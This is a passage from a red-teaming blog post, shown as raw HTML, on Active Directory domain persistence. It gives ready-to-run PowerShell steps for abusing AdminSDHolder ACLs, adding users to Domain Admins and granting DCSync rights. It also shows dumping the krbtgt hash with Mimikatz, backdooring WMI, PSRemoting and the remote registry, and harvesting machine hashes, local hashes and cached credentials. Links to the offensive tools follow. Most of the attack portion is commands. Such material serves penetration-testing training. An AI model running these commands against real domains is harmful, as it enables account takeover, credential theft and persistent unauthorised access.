</span><span class="nv">$Cred</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="p">(</span><span class="s1">'Domain-Name-Here\User-here'</span><span class="p">,</span><span class="w"> </span><span class="nv">$SecPassword</span><span class="p">)</span><span class="w">
</span><span class="c">#Set new password fot the user where you can abuse ForceChangePassword</span><span class="w">
</span><span class="nv">$UserPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'Password1!'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="c">#Update the password for that user</span><span class="w">
</span><span class="n">Set-DomainUserPassword</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">User-Whose-Password-You-Want-To-Change-here</span><span class="w"> </span><span class="nt">-AccountPassword</span><span class="w"> </span><span class="nv">$UserPassword</span><span class="w"> </span><span class="nt">-Crendential</span><span class="w"> </span><span class="nv">$Cred</span><span class="w">
</span></pre></table></code></div></div><h2 id="get-generic-all-access-"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Get Generic-All Access </span></span><a href="#get-generic-all-access-" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="import-the-admodule-and-set-the-sdpropagator-ps-script-in-the-same-path-folder"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">Import the ADModule and set the SDPropagator PS script in the same path folder</span></span><a href="#import-the-admodule-and-set-the-sdpropagator-ps-script-in-the-same-path-folder" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="n">Add-ObjectAcl</span><span class="w"> </span><span class="nt">-TargetADSprefix</span><span class="w"> </span><span class="s1">'CN=AdminSDHolder,CN=System'</span><span class="w"> </span><span class="nt">-PrincipalSamAccountName</span><span class="w"> </span><span class="nx">user1</span><span class="w"> </span><span class="nt">-Rights</span><span class="w"> </span><span class="nx">All</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span><span class="nv">$sess</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-PSSession</span><span class="w"> </span><span class="nt">-Computername</span><span class="w"> </span><span class="nx">star-dc.root.local</span><span class="w">
</span><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-FilePath</span><span class="w"> </span><span class="s2">".\Invoke-SDPropagator.ps1"</span><span class="w"> </span><span class="nt">-Session</span><span class="w"> </span><span class="nv">$sess</span><span class="w">
</span><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nt">-Session</span><span class="w"> </span><span class="nv">$sess</span><span class="w">
</span><span class="p">[</span><span class="n">star</span><span class="nt">-dc</span><span class="o">.</span><span class="nf">root</span><span class="o">.</span><span class="nf">local</span><span class="p">]:</span><span class="n">PS</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Invoke-SDPropagator</span><span class="w"> </span><span class="nt">-timeoutMinutes</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nt">-showProgress</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><h3 id="now-if-we-check-the-permissions-of-the-user-he-should-have-generic-all-access-available"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">Now if we check the permissions of the user he should have generic-all access available</span></span><a href="#now-if-we-check-the-permissions-of-the-user-he-should-have-generic-all-access-available" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-ObjectAcl</span><span class="w"> </span><span class="nt">-SamAccountName</span><span class="w"> </span><span class="s2">"Domain Admins"</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityReference</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s1">'user1'</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><h2 id="abusing-generic-all-access"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Abusing Generic-All Access</span></span><a href="#abusing-generic-all-access" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="abusing-full-control"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">Abusing Full-Control</span></span><a href="#abusing-full-control" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Add-DomainGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'Domain Admins'</span><span class="w"> </span><span class="nt">-Members</span><span class="w"> </span><span class="s1">'user1'</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><h1 id="acl---dcsync"><span style="color:lightblue">ACL - DCSync</span></h1><ul><li><p>There are even more interesting ACLs which can be abused.</p><li><p>For example, with DA privileges, the ACL for the domain root can be modified to provide useful rights like FullControl or the ability to run “DCSync”.</p></ul><h2 id="methodologysteps-4"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Methodology/Steps</span></span><a href="#methodologysteps-4" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ul class="task-list"><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />1. Check if user has replication rights with PowerView<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />2. If no replication rights for the users, add them from a Domain Administrator shell<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />3. Get the hashes of krbtgt or any other user we want</ul><h2 id="powerview"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">PowerView</span></span><a href="#powerview" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="1-add-rights-for-dcsync"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">1. Add Rights for DCSync</span></span><a href="#1-add-rights-for-dcsync" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Add-ObjectAcl</span><span class="w"> </span><span class="nt">-TargetDistinguishedName</span><span class="w"> </span><span class="s1">'DC=domain,DC=local'</span><span class="w"> </span><span class="nt">-PrincipalSamAccountName</span><span class="w"> </span><span class="nx">student1</span><span class="w"> </span><span class="nt">-Rights</span><span class="w"> </span><span class="nx">DCSync</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><h2 id="invoke-mimikatz-4"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Invoke-Mimikatz</span></span><a href="#invoke-mimikatz-4" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="2-execute-dcsync"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">2. Execute DCSync</span></span><a href="#2-execute-dcsync" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::dcsync /user:dcorp\krbtgt"'</span><span class="w">
</span></pre></table></code></div></div><h1 id="acl---security-descriptors"><span style="color:lightblue">ACL - Security Descriptors</span></h1><ul><li>It is possible to modify Security Descriptors (security information like Owner, primary group, DACL and SACL) of multiple remote access methods (securable objects) to allow access to non-admin users.<li><strong>Administrative privileges</strong> are required for this.<li>It, of course, works as a very useful and impactful backdoor mechanism.<li>Security Descriptor Definition Language defines the format which is used to describe a security descriptor. SDDL uses ACE strings for DACL and SACL:<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">ace_type;</span>ace_flags<span class="p">;</span>rights<span class="p">;</span>object_guid<span class="p">;</span>inherit_object_guid<span class="p">;</span>account_sid
</pre></table></code></div></div><li>ACE for built-in administrators for WMI namespaces<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">A;</span>Cl<span class="p">;</span>CCDCLCSWRPWPRCWD<span class="p">;;;</span>SID
</pre></table></code></div></div></ul><p>Documentation : https://docs.microsoft.com/en-us/windows/win32/secauthz/ace-strings?redirectedfrom=MSDN</p><h2 id="methodologysteps-5"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Methodology/Steps</span></span><a href="#methodologysteps-5" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ul class="task-list"><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />1. Once we have administrative privileges on a machine, we can modify security descriptors of services to access the services without administrative privileges.</ul><h2 id="set-remotewmi"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Set-RemoteWMI</span></span><a href="#set-remotewmi" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="1-on-local-machine-for-userx"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">1. On local machine for userX</span></span><a href="#1-on-local-machine-for-userx" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Set-RemoteWMI</span><span class="w"> </span><span class="nt">-UserName</span><span class="w"> </span><span class="nx">userX</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><h3 id="2-on-remote-machine-for-userx-without-explicit-credentials"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">2. On remote machine for userX without explicit credentials</span></span><a href="#2-on-remote-machine-for-userx-without-explicit-credentials" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Set-RemoteWMI</span><span class="w"> </span><span class="nt">-UserName</span><span class="w"> </span><span class="nx">userX</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">computer</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-namespace</span><span class="w"> </span><span class="s1">'root\cimv2'</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><h3 id="3-now-we-can-execute-wmi-commands"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">3. Now we can execute <strong>WMI</strong> commands</span></span><a href="#3-now-we-can-execute-wmi-commands" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nt">-Class</span><span class="w"> </span><span class="nx">win32_operatingsystem</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">computer</span><span class="err">&gt;</span><span class="w">
</span></pre></table></code></div></div><h3 id="4-on-remote-machine-with-explicit-credentials-only-rootcimv2-and-nested-namespaces"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">4. On remote machine with explicit credentials. Only root\cimv2 and nested namespaces</span></span><a href="#4-on-remote-machine-with-explicit-credentials-only-rootcimv2-and-nested-namespaces" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Set-RemoteWMI</span><span class="w"> </span><span class="nt">-UserName</span><span class="w"> </span><span class="nx">userX</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">computer</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nx">Administrator</span><span class="w"> </span><span class="nt">-namespace</span><span class="w"> </span><span class="s1">'root\cimv2'</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><h3 id="5-on-remote-machine-remove-permissions"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">5. On remote machine remove permissions</span></span><a href="#5-on-remote-machine-remove-permissions" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Set-RemoteWMI</span><span class="w"> </span><span class="nt">-UserName</span><span class="w"> </span><span class="nx">userX</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">computer</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-namespace</span><span class="w"> </span><span class="s1">'root\cimv2'</span><span class="w"> </span><span class="nt">-Remove</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><h2 id="set-remotepsremoting"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Set-RemotePSRemoting</span></span><a href="#set-remotepsremoting" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="1-on-local-machine-for-userx-1"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">1. On local machine for userX</span></span><a href="#1-on-local-machine-for-userx-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Set-RemotePSRemoting</span><span class="w"> </span><span class="nt">-UserName</span><span class="w"> </span><span class="nx">userX</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><h3 id="2-now-we-can-execute-scriptblock-commands-through-invoke-command"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">2. Now we can execute <strong>ScriptBlock</strong> commands through <strong>Invoke-Command</strong></span></span><a href="#2-now-we-can-execute-scriptblock-commands-through-invoke-command" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="w"> </span><span class="p">{</span><span class="n">whoami</span><span class="p">}</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="n">computer</span><span class="err">&gt;</span><span class="w">
</span></pre></table></code></div></div><h3 id="3-on-remote-machine-for-userx-without-credentials"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">3. On remote machine for userX without credentials</span></span><a href="#3-on-remote-machine-for-userx-without-credentials" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Set-RemotePSRemoting</span><span class="w"> </span><span class="nt">-UserName</span><span class="w"> </span><span class="nx">userX</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">computer</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><h3 id="4-on-remote-machine-remove-the-permissions"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">4. On remote machine, remove the permissions</span></span><a href="#4-on-remote-machine-remove-the-permissions" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Set-RemotePSRemoting</span><span class="w"> </span><span class="nt">-UserName</span><span class="w"> </span><span class="nx">userX</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">computer</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Remove</span><span class="w">
</span></pre></table></code></div></div><h2 id="add-remoteregbackdoor"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Add-RemoteRegBackdoor</span></span><a href="#add-remoteregbackdoor" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="1-using-damp-with-admin-privs-on-remote-machine"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">1. Using DAMP, with admin privs on remote machine</span></span><a href="#1-using-damp-with-admin-privs-on-remote-machine" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Add-RemoteRegBackdoor</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">computer</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Trustee</span><span class="w"> </span><span class="nx">user1</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><h2 id="remotehashretrieval"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">RemoteHashRetrieval</span></span><a href="#remotehashretrieval" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="2-as-student1-retrieve-machine-account-hash"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">2. As student1, retrieve machine account hash</span></span><a href="#2-as-student1-retrieve-machine-account-hash" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-RemoteMachineAccountHash</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">computer</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><blockquote class="prompt-warning"><div><p><strong>If errors, replace $IV by $InitV in the script</strong></p></div></blockquote><h3 id="3-retrieve-local-account-hash"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">3 .Retrieve local account hash</span></span><a href="#3-retrieve-local-account-hash" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-RemoteLocalAccountHash</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">computer</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><h3 id="4-retrieve-domain-cached-credentials"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">4. Retrieve domain cached credentials</span></span><a href="#4-retrieve-domain-cached-credentials" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-RemoteCachedCredential</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">computer</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><h1 id="tools-used"><span style="color:lightblue">Tools Used</span></h1><ol><li>Invoke-Mimikatz download from here : <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1">Invoke-Mimikatz</a><li>PowerView download from here : <a href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1">powerview.ps1</a><li>PowerView Dev download from here : <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">powerview.ps1</a><li>Set-RemoteWMI download from here : <a href="https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1">Set-RemoteWMI.ps1</a><li>Set-RemotePSRemoting download from here : <a href="https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemotePSRemoting.ps1">Set-RemotePSRemoting.ps1</a><li>Add-RemoteRegBackdoor download from here : <a href="https://github.com/HarmJ0y/DAMP/blob/master/Add-RemoteRegBackdoor.ps1">Add-RemoteRegBackdoor.ps1</a><li>RemoteHashRetrieval download from here : <a href="https://github.com/HarmJ0y/DAMP/blob/master/RemoteHashRetrieval.ps1">RemoteHashRetrieval.ps1</a></ol><p>If you find my articles interesting, you can buy me a coffee</p><p><a href="https://www.buymeacoffee.com/0xStarlight"><img data-src="https://img.buymeacoffee.com/button-api/?text=Buy me an OSCP?&amp;emoji=&amp;slug=0xStarlight&amp;button_colour=b86e19&amp;font_colour=ffffff&amp;font_family=Poppins&amp;outline_colour=ffffff&amp;coffee_colour=FFDD00" data-proofer-ignore></a></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/red-teaming/'>Red-Teaming</a>, <a href='/categories/active-directory-domain-persistence/'>Active-Directory-Domain-Persistence</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/active-directory/" class="post-tag no-text-decoration" >active-directory</a> <a href="/tags/amsi-bypass/" class="post-tag no-text-decoration" >amsi-bypass</a> <a href="/tags/active-directory-domain-persistence/" class="post-tag no-text-decoration" >active-directory-domain-persistence</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Active Directory - Domain Persistence - 0xStarlight&amp;url=https://0xstarlight.github.io/posts/Active-Directory-Domain-Persistence/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Active Directory - Domain Persistence - 0xStarlight&amp;u=https://0xstarlight.github.io/posts/Active-Directory-Domain-Persistence/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://0xstarlight.github.io/posts/Active-Directory-Domain-Persistence/&amp;text=Active Directory - Domain Persistence - 0xStarlight" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Active-Directory-Domain-Persistence/">Active Directory - Domain Persistence</a><li><a href="/posts/Active-Directory-Lateral-Movement/">Active Directory - Lateral Movement</a><li><a href="/posts/Active-Directory-Introduction/">Active Directory - Introduction</a><li><a href="/posts/CRTE-Exam-Review/">CRTE Exam Review</a><li><a href="/posts/Bypassing-Windows-Defender/">Bypassing Windows Defender</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/active-directory/">active-directory</a> <a class="post-tag" href="/tags/amsi-bypass/">amsi-bypass</a> <a class="post-tag" href="/tags/password-reuse/">password-reuse</a> <a class="post-tag" href="/tags/acl-enumeration/">ACL-enumeration</a> <a class="post-tag" href="/tags/active-directory-domain-persistence/">active-directory-domain-persistence</a> <a class="post-tag" href="/tags/active-directory-enumeration/">active-directory-enumeration</a> <a class="post-tag" href="/tags/active-directory-introduction/">active-directory-introduction</a> <a class="post-tag" href="/tags/active-directory-lateral-movement/">active-directory-lateral-movement</a> <a class="post-tag" href="/tags/active-directory-local-privilege-escalation/">active-directory-local-privilege-escalation</a> <a class="post-tag" href="/tags/as-rep/">AS-REP</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Offensive-powershell/"><div class="card-body"> <em class="timeago small" data-ts="1648612260" > 2022-03-30 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Active Directory - Offensive PowerShell</h3><div class="text-muted small"><p> Introduction Welcome to my second article in the Red Teaming Series (Offensive PowerShell). I hope 